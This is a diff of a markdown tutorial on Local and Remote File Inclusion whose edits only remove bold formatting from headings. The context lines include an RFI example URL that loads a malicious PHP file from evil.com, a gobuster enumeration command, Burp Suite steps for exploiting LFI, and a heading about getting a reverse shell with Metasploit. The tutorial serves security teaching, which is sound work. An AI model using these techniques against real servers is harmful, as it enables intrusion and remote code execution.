@@ -60,7 +60,7 @@ http://example.com/vulnerable.php?file=http://evil.com/malicious.php
 
 ---
 
-## **4️ LFI vs RFI: Key Differences**
+## 4️ LFI vs RFI: Key Differences
 | Feature  | Local File Inclusion (LFI) | Remote File Inclusion (RFI) |
 |----------|---------------------------|----------------------------|
 | **Target** | Local files on the server | Remote files from another server |
@@ -70,7 +70,7 @@ http://example.com/vulnerable.php?file=http://evil.com/malicious.php
 
 ---
 
-### ** Conclusion**
+###  Conclusion
 - **LFI**: Attacker includes **local** files on the server.
 - **RFI**: Attacker includes **remote** files from another server.
 - **Both can lead to full system compromise if not properly secured!**
@@ -90,7 +90,7 @@ gobuster dir -u http://target.com/ -w /usr/share/wordlists/dirb/common.txt -x ph
 
 ---
 
-## **2️ Exploit LFI Using Burp Suite**
+## 2️ Exploit LFI Using Burp Suite
 ### ** Burp Suite to Test LFI Manually**
 1. Open **Burp Suite** → Turn on **Intercept**.
 2. Capture the request for `vulnerable.php?file=xyz`.
@@ -108,7 +108,7 @@ Then **decode the base64 output** to view sensitive information.
 
 ---
 
-## **3️ Exploit RFI Using Metasploit**
+## 3️ Exploit RFI Using Metasploit
 ### ** Use Metasploit to Get a Reverse Shell**
 1. Start Metasploit:
    ```bash
